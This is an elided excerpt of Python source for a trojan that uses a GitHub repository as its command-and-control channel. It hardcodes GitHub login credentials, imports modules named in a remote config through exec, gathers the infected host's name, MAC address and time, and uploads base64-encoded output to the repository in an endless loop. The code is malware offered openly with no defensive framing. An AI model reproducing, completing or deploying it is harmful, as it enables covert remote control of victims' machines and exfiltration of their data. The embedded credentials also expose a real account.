...
gh_username = "Maskman24610"
gh_password = "psp12358"
    ...
    def load_modules(config_file_path, config_file_contents):
        ...
        for module_dict in trojan_config_file_json:
            ...
            if module not in sys.modules:
                exec("import {}".format(module)) in globals(), locals()
                loaded_modules.append({"loaded_module": module})
            else:
                loaded_modules.append({"loaded_module": module})
        if len(loaded_modules) == len(trojan_config_file_json):
            trojan_output_file_contents += "[*] Successful Modules Import From: {}\n".format(config_file_path)
...
def store_output():
    ...
    if sha:
        repo.update_file(trojan_output_file_path, trojan_output_file_name,
                         base64.b64encode(trojan_output_file_contents.encode()), sha)
    else:
        repo.create_file(trojan_output_file_path, trojan_output_file_name,
                         base64.b64encode(trojan_output_file_contents.encode()))
    return
...
while True:
    ...
    trojan_output_file_contents += "[*] Running On: {}\n".format(platform.node() + '-' + hex(getnode()))
    trojan_output_file_contents += "[*] Time: {}\n".format(datetime.utcnow().isoformat())
    if task_queue.empty():
    ...
    sleep_time = 10
    trojan_output_file_contents += "[*] Sleeping For {} Seconds\n".format(sleep_time)
